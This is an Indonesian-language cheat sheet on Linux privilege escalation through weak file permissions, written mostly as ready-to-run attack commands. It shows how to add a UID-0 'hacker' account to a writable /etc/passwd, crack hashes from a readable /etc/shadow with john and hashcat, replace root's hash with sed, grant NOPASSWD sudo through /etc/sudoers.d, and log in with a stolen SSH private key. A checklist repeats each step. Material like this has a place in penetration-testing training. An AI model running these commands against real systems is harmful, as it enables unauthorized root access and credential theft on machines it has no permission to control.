# 🔓 Weak File Permission (File Permission Misconfiguration)

> **Tujuan:** Memanfaatkan file sistem penting yang **readable / writable** oleh user tidak berhak untuk melakukan **privilege escalation** atau **credential disclosure**.

---

## 📌 Penjelasan Singkat

Weak File Permission terjadi ketika file penting memiliki permission terlalu longgar (readable/writable oleh user biasa). Dampaknya antara lain: **credential disclosure**, **account takeover**, atau **modifikasi konfigurasi privilege** seperti `sudoers`.

---

## 🛡️ Inspeksi File Penting

```bash
ls -la /etc/passwd /etc/shadow /etc/sudoers /etc/sudoers.d/
```

| File | Owner Normal | Dampak Jika Writable |
|------|--------------|---------------------|
| `/etc/passwd` | root | Tambah user root baru |
| `/etc/shadow` | root | Crack/replace hash root |
| `/etc/sudoers` | root | Modifikasi hak sudo |
| `/etc/sudoers.d/*` | root | Tambah file konfigurasi sudo |
| `~/.ssh/id_rsa` | user | Login sebagai user lain |

---

## 1️⃣ `/etc/passwd` Writable

Jika user biasa dapat menulis `/etc/passwd`, attacker dapat menambahkan akun root baru.

```bash
# Generate password hash
openssl passwd -1 pass123

# Tambah user root baru
echo 'hacker:$1$xyz$hash:0:0:root:/root:/bin/bash' >> /etc/passwd

# Login sebagai root
su hacker   # password: pass123
```

| Field | Nilai |
|-------|-------|
| `UID` | `0` |
| `GID` | `0` |
| Home | `/root` |
| Shell | `/bin/bash` |

---

## 2️⃣ `/etc/shadow` Readable

Jika `/etc/shadow` readable, attacker dapat mencuri hash password lalu di-crack dengan **John the Ripper** atau **Hashcat**.

```bash
cat /etc/shadow
# Ambil baris root → hash field ke-2

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1800 hash.txt rockyou.txt
```

---

## 3️⃣ `/etc/shadow` Writable

```bash
# Generate hash baru
openssl passwd -1 pass123
# atau
mkpasswd -m sha-512 pass123

# Backup
cp /etc/shadow /tmp/shadow.bak

# Replace root hash (field ke-2)
sed -i 's|^root:[^:]*:|root:$1$xyz$hash_disini:|' /etc/shadow

# Login sebagai root
su root   # password: pass123
```

> ⚠️ Format hash harus sesuai dengan konfigurasi hashing sistem. Selalu **backup** sebelum modifikasi.

---

## 4️⃣ `/etc/sudoers.d/` Writable

Jika user biasa dapat menambahkan file di `/etc/sudoers.d/`, attacker dapat membuat file sudoers baru yang memberikan **hak root tanpa password**.

```bash
echo "hacker ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/hacker
sudo su
```

| Field | Arti |
|-------|------|
| `<user>` | User yang diberi privilege |
| `ALL=(ALL)` | Jalankan sebagai user mana pun |
| `NOPASSWD` | Tidak perlu password |
| `ALL` | Semua command |

---

## 5️⃣ SSH Private Key Readable

```bash
cat /home/<user>/.ssh/id_rsa
chmod 600 id_rsa
ssh -i id_rsa <user>@<TARGET>
```

> Jika `id_rsa` dapat dibaca tanpa permission, attacker dapat langsung login sebagai user tersebut.

---

## 🪜 Alur Pemeriksaan

```text
Cari File Penting
      ↓
Cek Permission
      ↓
Cek Owner / Group
      ↓
Readable? Writable?
      ↓
Identifikasi Dampak
      ↓
Validasi Privilege Escalation
```

---

## 📋 Checklist Weak File Permission

- [ ] Inspect `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`, `/etc/sudoers.d/`.
- [ ] Cek `~/.ssh/id_rsa` pada home user.
- [ ] Tentukan apakah file **readable** atau **writable** oleh user tidak berhak.
- [ ] Crack hash dengan `john` / `hashcat` jika `/etc/shadow` readable.
- [ ] Tambahkan user root baru jika `/etc/passwd` writable.
- [ ] Replace hash root jika `/etc/shadow` writable.
- [ ] Tambahkan file sudoers jika `/etc/sudoers.d/` writable.
- [ ] Gunakan SSH key untuk login ke user lain jika `id_rsa` readable.
- [ ] Verifikasi privilege dengan `id` → `uid=0(root)`.

---

## 📚 Referensi

- [OWASP – Privilege Escalation Cheat Sheet](https://owasp.org/www-project-privilege-escalation-cheat-sheet)
- [John the Ripper – Password Cracker](https://www.openwall.com/john/)
- [Hashcat – Advanced Password Recovery](https://hashcat.net/hashcat/)
